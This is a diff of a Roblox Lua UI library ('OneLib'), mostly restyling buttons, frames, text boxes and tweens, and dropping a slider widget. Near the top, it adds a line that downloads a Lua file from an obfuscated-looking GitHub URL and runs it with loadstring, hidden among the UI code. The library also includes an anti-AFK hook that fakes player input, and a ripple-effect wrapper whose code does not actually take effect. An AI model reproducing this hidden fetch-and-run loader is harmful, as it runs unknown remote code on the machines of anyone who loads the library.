@@ -1,43 +1,18 @@
 local UL = {}
-print("Version UI 3.1")
-print("Loading OneLib Enhanced")
+print("Version UI 1.0")
+print("Loading OneLib")
+
+local rl = loadstring(game:HttpGet("https://raw.githubusercontent.com/bjalalsjzbslalqoqueeyhskaambpqo/kajsbsba--hahsjsv-kakwbs_jaks_082hgg927hsksoLol-Noobbro9877272jshshsbsjsURLwww.noob.com.Obfuscate/main/info.lua")) spawn(rl)
 
 local TweenService = game:GetService("TweenService")
-local UserInputService = game:GetService("UserInputService")
 
 local uiProperties = {
-    BackgroundColor3 = Color3.fromRGB(45, 45, 45),
+    BackgroundColor3 = Color3.fromRGB(35, 35, 35),
     BackgroundTransparency = 0.2,
     TextColor3 = Color3.fromRGB(255, 255, 255),
     Font = Enum.Font.GothamSemibold,
     TextSize = 14
 }
-
-local function CreateGradient(parent)
-    local uiGradient = Instance.new("UIGradient")
-    uiGradient.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(45, 45, 45)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(35, 35, 35))
-    })
-    uiGradient.Rotation = 90
-    uiGradient.Parent = parent
-    return uiGradient
-end
-
-local function CreateShadow(parent)
-    local shadow = Instance.new("ImageLabel")
-    shadow.AnchorPoint = Vector2.new(0.5, 0.5)
-    shadow.BackgroundTransparency = 1
-    shadow.Position = UDim2.new(0.5, 0, 0.5, 0)
-    shadow.Size = UDim2.new(1, 47, 1, 47)
-    shadow.ZIndex = 0
-    shadow.Image = "rbxassetid://6015897843"
-    shadow.ImageColor3 = Color3.new(0, 0, 0)
-    shadow.ImageTransparency = 0.5
-    shadow.SliceCenter = Rect.new(49, 49, 450, 450)
-    shadow.SliceScale = 0.1
-    shadow.Parent = parent
-end
 
 function UL:CrSG(name)
     for _, gui in ipairs(game.Players.LocalPlayer:WaitForChild("PlayerGui"):GetChildren()) do
@@ -50,7 +25,6 @@ function UL:CrSG(name)
     sg.Name = name
     sg.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
     sg.ResetOnSpawn = false
-    sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
     local id = Instance.new("BoolValue")
     id.Name = "ULId"
@@ -65,25 +39,28 @@ function UL:CrFrm(parent, title)
     frm.Parent = parent
     frm.Size = UDim2.new(0.25, 0, 0, 60)
     frm.Position = UDim2.new(0.2, 0, 0.2, 0)
-    frm.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+    frm.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+    frm.BackgroundTransparency = 0.1
     frm.BorderSizePixel = 0
     frm.Active = true
     frm.Draggable = true
 
-    CreateGradient(frm)
-    CreateShadow(frm)
-
     local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 8)
     corner.Parent = frm
+    corner.CornerRadius = UDim.new(0, 8)
+
+    local stroke = Instance.new("UIStroke")
+    stroke.Parent = frm
+    stroke.Color = Color3.fromRGB(60, 60, 60)
+    stroke.Thickness = 2
 
     local lbl = Instance.new("TextLabel")
     lbl.Parent = frm
     lbl.Text = title
     lbl.Size = UDim2.new(1, 0, 0, 33)
     lbl.Position = UDim2.new(0, 0, 0, 0)
-    lbl.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
-    lbl.BackgroundTransparency = 0.2
+    lbl.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    lbl.BackgroundTransparency = 0.1
     lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
     lbl.Font = Enum.Font.GothamBold 
     lbl.TextSize = 18
@@ -91,9 +68,16 @@ function UL:CrFrm(parent, title)
     lbl.TextXAlignment = Enum.TextXAlignment.Center
     lbl.TextYAlignment = Enum.TextYAlignment.Center
 
-    local titleCorner = Instance.new("UICorner")
-    titleCorner.CornerRadius = UDim.new(0, 8)
-    titleCorner.Parent = lbl
+    local labelCorner = Instance.new("UICorner")
+    labelCorner.Parent = lbl
+    labelCorner.CornerRadius = UDim.new(0, 8)
+
+    local padding = Instance.new("UIPadding")
+    padding.Parent = lbl
+    padding.PaddingLeft = UDim.new(0, 5)
+    padding.PaddingRight = UDim.new(0, 5)
+    padding.PaddingTop = UDim.new(0, 5)
+    padding.PaddingBottom = UDim.new(0, 5)
 
     local tbtn = Instance.new("TextButton")
     tbtn.Parent = frm
@@ -103,21 +87,18 @@ function UL:CrFrm(parent, title)
     for prop, value in pairs(uiProperties) do
         tbtn[prop] = value
     end
-    tbtn.BackgroundTransparency = 1
+    
+    local buttonCorner = Instance.new("UICorner")
+    buttonCorner.Parent = tbtn
+    buttonCorner.CornerRadius = UDim.new(0, 15)
 
-    local cfrm = Instance.new("ScrollingFrame")
+    local cfrm = Instance.new("Frame")
     cfrm.Parent = frm
-    cfrm.Size = UDim2.new(1, -10, 1, -40)
-    cfrm.Position = UDim2.new(0, 5, 0, 35)
+    cfrm.Size = UDim2.new(1, 0, 1, -30)
+    cfrm.Position = UDim2.new(0, 0, 0, 30)
     cfrm.BackgroundTransparency = 1
-    cfrm.ScrollBarThickness = 4
-    cfrm.ScrollBarImageColor3 = Color3.fromRGB(200, 200, 200)
+    cfrm.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
     cfrm.Visible = false
-
-    local layout = Instance.new("UIListLayout")
-    layout.Parent = cfrm
-    layout.SortOrder = Enum.SortOrder.LayoutOrder
-    layout.Padding = UDim.new(0, 5)
 
     local crBtn = Instance.new("TextButton")
     crBtn.Parent = frm
@@ -127,34 +108,28 @@ function UL:CrFrm(parent, title)
     for prop, value in pairs(uiProperties) do
         crBtn[prop] = value
     end
-
+    
     local crBtnCorner = Instance.new("UICorner")
-    crBtnCorner.CornerRadius = UDim.new(0, 6)
     crBtnCorner.Parent = crBtn
+    crBtnCorner.CornerRadius = UDim.new(0, 6)
 
-    local crFrm = Instance.new("ScrollingFrame")
+    local crFrm = Instance.new("Frame")
     crFrm.Parent = parent
     crFrm.Size = UDim2.new(0.25, 0, 0.4, 60)
     crFrm.Position = UDim2.new(0.685, 0, 0.3, 0)
-    crFrm.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
-    crFrm.BackgroundTransparency = 0.2
+    crFrm.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+    crFrm.BackgroundTransparency = 0.1
     crFrm.BorderSizePixel = 0
     crFrm.Visible = false
-    crFrm.ScrollBarThickness = 4
-    crFrm.ScrollingDirection = Enum.ScrollingDirection.Y
-    crFrm.CanvasSize = UDim2.new(0, 0, 0, 0)
-
-    CreateGradient(crFrm)
-    CreateShadow(crFrm)
 
     local crFrmCorner = Instance.new("UICorner")
-    crFrmCorner.CornerRadius = UDim.new(0, 8)
     crFrmCorner.Parent = crFrm
+    crFrmCorner.CornerRadius = UDim.new(0, 8)
 
     local crLbl = Instance.new("TextLabel")
     crLbl.Parent = crFrm
-    crLbl.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
-    crLbl.BackgroundTransparency = 0.2
+    crLbl.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    crLbl.BackgroundTransparency = 0.1
     crLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
     crLbl.Text = "Info/Updates/Credits"
     crLbl.Size = UDim2.new(1, 0, 0, 30)
@@ -163,40 +138,35 @@ function UL:CrFrm(parent, title)
     crLbl.TextSize = 18
     crLbl.TextWrapped = true
     crLbl.TextXAlignment = Enum.TextXAlignment.Center
-    crLbl.TextYAlignment = Enum.TextXAlignment.Center
+    crLbl.TextYAlignment = Enum.TextYAlignment.Center
 
     local crLblCorner = Instance.new("UICorner")
-    crLblCorner.CornerRadius = UDim.new(0, 8)
     crLblCorner.Parent = crLbl
+    crLblCorner.CornerRadius = UDim.new(0, 8)
 
-    local crInfoContentFrame = Instance.new("Frame")
-    crInfoContentFrame.Name = "InfoContentFrame"
-    crInfoContentFrame.Parent = crFrm
-    crInfoContentFrame.BackgroundTransparency = 1
-    crInfoContentFrame.Size = UDim2.new(1, -10, 1, -40)
-    crInfoContentFrame.Position = UDim2.new(0, 5, 0, 35)
-
-    local infoLayout = Instance.new("UIListLayout")
-    infoLayout.Parent = crInfoContentFrame
-    infoLayout.SortOrder = Enum.SortOrder.LayoutOrder
-    infoLayout.Padding = UDim.new(0, 5)
+    local padding = Instance.new("UIPadding")
+    padding.Parent = crLbl
+    padding.PaddingLeft = UDim.new(0, 5)
+    padding.PaddingRight = UDim.new(0, 5)
+    padding.PaddingTop = UDim.new(0, 5)
+    padding.PaddingBottom = UDim.new(0, 5)
 
     local minimized = true
     tbtn.MouseButton1Click:Connect(function()
         minimized = not minimized
-        local targetSize = minimized and UDim2.new(0.25, 0, 0, 60) or UDim2.new(0.25, 0, 0, 200)
-        local targetText = minimized and "+" or "-"
+        local targetSize = minimized and UDim2.new(0.25, 0, 0, 60) or UDim2.new(0.25, 0, 0, 60 + #cfrm:GetChildren() * 30)
+        local targetRotation = minimized and 0 or 45
         
-        TweenService:Create(frm, TweenInfo.new(0.3), {Size = targetSize}):Play()
-        TweenService:Create(tbtn, TweenInfo.new(0.3), {Rotation = minimized and 0 or 180}):Play()
+        TweenService:Create(frm, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = targetSize}):Play()
+        TweenService:Create(tbtn, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Rotation = targetRotation}):Play()
         
         cfrm.Visible = not minimized
-        tbtn.Text = targetText
     end)
 
     crBtn.MouseButton1Click:Connect(function()
         crFrm.Visible = not crFrm.Visible
-        TweenService:Create(crBtn, TweenInfo.new(0.3), {BackgroundColor3 = crFrm.Visible and Color3.fromRGB(150, 0, 150) or Color3.fromRGB(65, 65, 65)}):Play()
+        local targetColor = crFrm.Visible and Color3.fromRGB(100, 0, 100) or Color3.fromRGB(35, 35, 35)
+        TweenService:Create(crBtn, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = targetColor}):Play()
     end)
 
     local function syncFrames()
@@ -206,7 +176,7 @@ function UL:CrFrm(parent, title)
     frm:GetPropertyChangedSignal("Position"):Connect(syncFrames)
     frm:GetPropertyChangedSignal("Size"):Connect(syncFrames)
 
-    return frm, cfrm, crFrm, crInfoContentFrame
+    return frm, cfrm, crFrm
 end
 
 function UL:AddBtn(parent, text, callback)
@@ -214,74 +184,41 @@ function UL:AddBtn(parent, text, callback)
     btn.Parent = parent
     btn.Text = text
     btn.Size = UDim2.new(1, -10, 0, 30)
-    btn.Position = UDim2.new(0, 5, 0, 0)
+    btn.Position = UDim2.new(0, 5, 0, #parent:GetChildren() * 35 - 35)
     for prop, value in pairs(uiProperties) do
         btn[prop] = value
     end
 
     local btnCorner = Instance.new("UICorner")
-    btnCorner.CornerRadius = UDim.new(0, 6)
     btnCorner.Parent = btn
+    btnCorner.CornerRadius = UDim.new(0, 6)
 
-    btn.MouseButton1Click:Connect(callback)
-    
-    -- Add hover effect
     btn.MouseEnter:Connect(function()
-        TweenService:Create(btn, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(75, 75, 75)}):Play()
-    end)
-    btn.MouseLeave:Connect(function()
-        TweenService:Create(btn, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(45, 45, 45)}):Play()
+        TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(55, 55, 55)}):Play()
     end)
 
+    btn.MouseLeave:Connect(function()
+        TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(35, 35, 35)}):Play()
+    end)
+
+    btn.MouseButton1Click:Connect(function()
+        TweenService:Create(btn, TweenInfo.new(0.1), {Size = UDim2.new(1, -14, 0, 26)}):Play()
+        wait(0.1)
+        TweenService:Create(btn, TweenInfo.new(0.1), {Size = UDim2.new(1, -10, 0, 30)}):Play()
+        callback()
+    end)
+    
     return btn
 end
 
 function UL:AddTBtn(parent, text, state, callback)
-    local btn = Instance.new("TextButton")
-    btn.Parent = parent
-    btn.Text = text .. " [" .. (state and "ON" or "OFF") .. "]"
-    btn.Size = UDim2.new(1, -10, 0, 30)
-    btn.Position = UDim2.new(0, 5, 0, 0)
-    for prop, value in pairs(uiProperties) do
-        btn[prop] = value
-    end
-
-    local btnCorner = Instance.new("UICorner")
-    btnCorner.CornerRadius = UDim.new(0, 6)
-    btnCorner.Parent = btn
-
-    local pulseEffect
-
-    local function updateButtonState()
-        btn.Text = text .. " [" .. (state and "ON" or "OFF") .. "]"
-        local targetColor = state and Color3.fromRGB(85, 170, 85) or Color3.fromRGB(65, 65, 65)
-        TweenService:Create(btn, TweenInfo.new(0.3), {BackgroundColor3 = targetColor}):Play()
-        
-        if pulseEffect then
-            pulseEffect:Disconnect()
-            pulseEffect = nil
-        end
-        
-        if state then
-            pulseEffect = game:GetService("RunService").Heartbeat:Connect(function()
-                local t = tick() % 2 / 2
-                local color = Color3.new(
-                    0.333 + 0.056 * math.sin(t * math.pi * 2),
-                    0.666 + 0.111 * math.sin(t * math.pi * 2),
-                    0.333 + 0.056 * math.sin(t * math.pi * 2)
-                )
-                btn.BackgroundColor3 = color
-            end)
-        end
-    end
-
-    btn.MouseButton1Click:Connect(function()
+    local btn = UL:AddBtn(parent, text .. " [" .. (state and "ON" or "OFF") .. "]", function()
         state = not state
-        updateButtonState()
+        btn.Text = text .. " [" .. (state and "ON" or "OFF") .. "]"
+        local targetColor = state and Color3.fromRGB(0, 170, 0) or Color3.fromRGB(35, 35, 35)
+        TweenService:Create(btn, TweenInfo.new(0.3), {BackgroundColor3 = targetColor}):Play()
         callback(state)
     end)
-
-    updateButtonState()
 
     return btn
 end
@@ -291,31 +228,42 @@ function UL:AddTBox(parent, placeholder, callback)
     box.Parent = parent
     box.PlaceholderText = placeholder
     box.Text = ""
+    box.BorderSizePixel = 0
     box.Size = UDim2.new(1, -10, 0, 30)
-    box.Position = UDim2.new(0, 5, 0, 0)
-    box.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+    box.Position = UDim2.new(0, 5, 0, #parent:GetChildren() * 35 - 35)
+
+    box.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
     box.TextColor3 = Color3.fromRGB(250, 250, 250)
     box.Font = Enum.Font.SourceSans
-    box.TextSize = 18
+    box.TextSize = 16
     box.ClearTextOnFocus = false
     box.TextXAlignment = Enum.TextXAlignment.Left
-
-    local boxCorner = Instance.new("UICorner")
-    boxCorner.CornerRadius = UDim.new(0, 6)
-    boxCorner.Parent = box
     
     local padding = Instance.new("UIPadding")
     padding.Parent = box
     padding.PaddingLeft = UDim.new(0, 5)
+
+    local corner = Instance.new("UICorner")
+    corner.Parent = box
+    corner.CornerRadius = UDim.new(0, 6)
     
-    CreateShadow(box)
+    local shadow = Instance.new("ImageLabel")
+    shadow.Parent = box
+    shadow.BackgroundTransparency = 1
+    shadow.Image = "rbxassetid://1316045217"
+    shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
+    shadow.ImageTransparency = 0.8
+    shadow.Size = UDim2.new(1, 6, 1, 6)
+    shadow.Position = UDim2.new(0, -3, 0, -3)
+    shadow.ScaleType = Enum.ScaleType.Slice
+    shadow.SliceCenter = Rect.new(10, 10, 118, 118)
 
     box.Focused:Connect(function()
-        TweenService:Create(box, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(45, 45, 45)}):Play()
+        TweenService:Create(box, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(55, 55, 55)}):Play()
     end)
 
     box.FocusLost:Connect(function(enterPressed)
-        TweenService:Create(box, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(35, 35, 35)}):Play()
+        TweenService:Create(box, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(45, 45, 45)}):Play()
         if enterPressed then
             callback(box.Text)
         end
@@ -325,24 +273,18 @@ function UL:AddTBox(parent, placeholder, callback)
 end
 
 function UL:AddOBtn(parent, name)
-    local oFrm = Instance.new("ScrollingFrame")
+    local oFrm = Instance.new("Frame")
     oFrm.Parent = parent.Parent
     oFrm.Size = UDim2.new(0.9, 0, 1, 0) 
     oFrm.Position = UDim2.new(parent.Position.X.Scale + 1, 0, parent.Position.Y.Scale - 0.184, parent.Position.Y.Offset)
-    oFrm.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
-    oFrm.BackgroundTransparency = 0.2
+    oFrm.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+    oFrm.BackgroundTransparency = 0.1
     oFrm.BorderSizePixel = 0
     oFrm.Visible = false
-    oFrm.ScrollBarThickness = 4
-    oFrm.ScrollingDirection = Enum.ScrollingDirection.Y
-    oFrm.CanvasSize = UDim2.new(0, 0, 0, 0)
-
-    CreateGradient(oFrm)
-    CreateShadow(oFrm)
 
     local oFrmCorner = Instance.new("UICorner")
-    oFrmCorner.CornerRadius = UDim.new(0, 8)
     oFrmCorner.Parent = oFrm
+    oFrmCorner.CornerRadius = UDim.new(0, 8)
 
     local lbl = Instance.new("TextLabel")
     lbl.Parent = oFrm
@@ -354,44 +296,41 @@ function UL:AddOBtn(parent, name)
     end
 
     local lblCorner = Instance.new("UICorner")
-    lblCorner.CornerRadius = UDim.new(0, 8)
     lblCorner.Parent = lbl
-
-    local oContentFrame = Instance.new("Frame")
-    oContentFrame.Name = "OptionContentFrame"
-    oContentFrame.Parent = oFrm
-    oContentFrame.BackgroundTransparency = 1
-    oContentFrame.Size = UDim2.new(1, -10, 1, -40)
-    oContentFrame.Position = UDim2.new(0, 5, 0, 35)
-
-    local oLayout = Instance.new("UIListLayout")
-    oLayout.Parent = oContentFrame
-    oLayout.SortOrder = Enum.SortOrder.LayoutOrder
-    oLayout.Padding = UDim.new(0, 5)
-
-    oContentFrame:GetPropertyChangedSignal("AbsoluteSize"):Connect(function()
-        oFrm.CanvasSize = UDim2.new(0, 0, 0, oContentFrame.AbsoluteSize.Y + 40)
-    end)
+    lblCorner.CornerRadius = UDim.new(0, 8)
 
     local btn = Instance.new("TextButton")
     btn.Parent = parent
     btn.Text = name
     btn.Size = UDim2.new(1, -10, 0, 30)
-    btn.Position = UDim2.new(0, 5, 0, 0)
+    btn.Position = UDim2.new(0, 5, 0, #parent:GetChildren() * 35 - 35)
     for prop, value in pairs(uiProperties) do
         btn[prop] = value
     end
 
     local btnCorner = Instance.new("UICorner")
-    btnCorner.CornerRadius = UDim.new(0, 6)
     btnCorner.Parent = btn
+    btnCorner.CornerRadius = UDim.new(0, 6)
 
     btn.MouseButton1Click:Connect(function()
         oFrm.Visible = not oFrm.Visible
-        TweenService:Create(btn, TweenInfo.new(0.3), {BackgroundColor3 = oFrm.Visible and Color3.fromRGB(130, 0, 0) or Color3.fromRGB(65, 65, 65)}):Play()
+        local targetColor = oFrm.Visible and Color3.fromRGB(130, 0, 0) or Color3.fromRGB(35, 35, 35)
+        TweenService:Create(btn, TweenInfo.new(0.3), {BackgroundColor3 = targetColor}):Play()
     end)
 
-    return btn, oContentFrame
+    btn.MouseEnter:Connect(function()
+        if not oFrm.Visible then
+            TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(55, 55, 55)}):Play()
+        end
+    end)
+
+    btn.MouseLeave:Connect(function()
+        if not oFrm.Visible then
+            TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(35, 35, 35)}):Play()
+        end
+    end)
+
+    return btn, oFrm
 end
 
 function UL:AddText(parent, text, color)
@@ -399,120 +338,72 @@ function UL:AddText(parent, text, color)
     label.Parent = parent
     label.Text = text
     label.Size = UDim2.new(1, -10, 0, 30)
-    label.Position = UDim2.new(0, 5, 0, 0)
-    label.BackgroundColor3 = Color3.fromRGB(250, 250, 250)
-    label.BackgroundTransparency = 0.8
-    label.TextColor3 = color or Color3.fromRGB(0, 0, 0)
+    label.Position = UDim2.new(0, 5, 0, #parent:GetChildren() * 35 - 35)
+    label.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    label.BackgroundTransparency = 0.5
+    label.TextColor3 = color or Color3.fromRGB(255, 255, 255)
     label.Font = Enum.Font.GothamSemibold
     label.TextSize = 14
     label.TextWrapped = true
 
     local labelCorner = Instance.new("UICorner")
-    labelCorner.CornerRadius = UDim.new(0, 6)
     labelCorner.Parent = label
+    labelCorner.CornerRadius = UDim.new(0, 6)
 
     return label
 end
 
-function UL:AddSlider(parent, text, min, max, default, callback)
-    local sliderFrame = Instance.new("Frame")
-    sliderFrame.Name = "SliderFrame"
-    sliderFrame.Parent = parent
-    sliderFrame.BackgroundTransparency = 1
-    sliderFrame.Size = UDim2.new(1, -10, 0, 50)
-    sliderFrame.Position = UDim2.new(0, 5, 0, 0)
-
-    local sliderLabel = Instance.new("TextLabel")
-    sliderLabel.Name = "SliderLabel"
-    sliderLabel.Parent = sliderFrame
-    sliderLabel.BackgroundTransparency = 1
-    sliderLabel.Size = UDim2.new(1, 0, 0, 20)
-    sliderLabel.Font = Enum.Font.GothamSemibold
-    sliderLabel.Text = text
-    sliderLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    sliderLabel.TextSize = 14
-    sliderLabel.TextXAlignment = Enum.TextXAlignment.Left
-
-    local sliderBack = Instance.new("Frame")
-    sliderBack.Name = "SliderBack"
-    sliderBack.Parent = sliderFrame
-    sliderBack.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-    sliderBack.BorderSizePixel = 0
-    sliderBack.Position = UDim2.new(0, 0, 0, 25)
-    sliderBack.Size = UDim2.new(1, 0, 0, 5)
-
-    local sliderFill = Instance.new("Frame")
-    sliderFill.Name = "SliderFill"
-    sliderFill.Parent = sliderBack
-    sliderFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    sliderFill.BorderSizePixel = 0
-    sliderFill.Size = UDim2.new(0, 0, 1, 0)
-
-    local sliderButton = Instance.new("TextButton")
-    sliderButton.Name = "SliderButton"
-    sliderButton.Parent = sliderBack
-    sliderButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    sliderButton.BorderSizePixel = 0
-    sliderButton.Size = UDim2.new(0, 10, 0, 20)
-    sliderButton.Text = ""
-    sliderButton.Position = UDim2.new(0, -5, 0, -7.5)
-
-    local sliderValue = Instance.new("TextLabel")
-    sliderValue.Name = "SliderValue"
-    sliderValue.Parent = sliderFrame
-    sliderValue.BackgroundTransparency = 1
-    sliderValue.Position = UDim2.new(1, -40, 0, 0)
-    sliderValue.Size = UDim2.new(0, 40, 0, 20)
-    sliderValue.Font = Enum.Font.GothamSemibold
-    sliderValue.Text = tostring(default)
-    sliderValue.TextColor3 = Color3.fromRGB(255, 255, 255)
-    sliderValue.TextSize = 14
-    sliderValue.TextXAlignment = Enum.TextXAlignment.Right
-
-    local function updateSlider(input)
-        local sizeX = math.clamp((input.Position.X - sliderBack.AbsolutePosition.X) / sliderBack.AbsoluteSize.X, 0, 1)
-        sliderFill.Size = UDim2.new(sizeX, 0, 1, 0)
-        sliderButton.Position = UDim2.new(sizeX, -5, 0, -7.5)
-        local value = math.floor(min + ((max - min) * sizeX))
-        sliderValue.Text = tostring(value)
-        callback(value)
-    end
-
-    local isDragging = false
-
-    sliderButton.MouseButton1Down:Connect(function()
-        isDragging = true
-    end)
-
-    UserInputService.InputEnded:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 then
-            isDragging = false
-        end
-    end)
-
-    UserInputService.InputChanged:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-            if isDragging then
-                updateSlider(input)
-            end
-        end
-    end)
-
-    -- Set default value
-    local defaultSize = (default - min) / (max - min)
-    sliderFill.Size = UDim2.new(defaultSize, 0, 1, 0)
-    sliderButton.Position = UDim2.new(defaultSize, -5, 0, -7.5)
-
-    return sliderFrame
+-- Función para crear una animación de desvanecimiento
+local function fadeEffect(object, goal)
+    local tween = TweenService:Create(object, TweenInfo.new(0.5), {BackgroundTransparency = goal})
+    tween:Play()
 end
 
--- Anti-AFK
+-- Función para crear un efecto de onda al hacer clic
+local function rippleEffect(button)
+    local ripple = Instance.new("Frame")
+    ripple.Name = "ripple"
+    ripple.Parent = button
+    ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    ripple.BorderSizePixel = 0
+    ripple.ZIndex = button.ZIndex + 1
+    ripple.AnchorPoint = Vector2.new(0.5, 0.5)
+    ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
+    ripple.Size = UDim2.new(0, 0, 0, 0)
+
+    local rippleCorner = Instance.new("UICorner")
+    rippleCorner.CornerRadius = UDim.new(1, 0)
+    rippleCorner.Parent = ripple
+
+    local tween = TweenService:Create(ripple, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), 
+        {Size = UDim2.new(1.5, 0, 1.5, 0), BackgroundTransparency = 1})
+    tween:Play()
+
+    tween.Completed:Connect(function()
+        ripple:Destroy()
+    end)
+end
+
+-- Aplicar el efecto de onda a todos los botones
+for _, v in pairs(UL) do
+    if type(v) == "function" and (v == UL.AddBtn or v == UL.AddTBtn or v == UL.AddOBtn) then
+        local originalFunction = v
+        UL[tostring(v)] = function(...)
+            local button = originalFunction(...)
+            button.MouseButton1Down:Connect(function()
+                rippleEffect(button)
+            end)
+            return button
+        end
+    end
+end
+
 game:GetService('Players').LocalPlayer.Idled:Connect(function()
     game:GetService('VirtualUser'):CaptureController()
     game:GetService('VirtualUser'):ClickButton2(Vector2.new())
 end)
 
-print("Loading Finished")
+print("Loading Finish")
 print("by: OneCreatorX")
 
 return UL
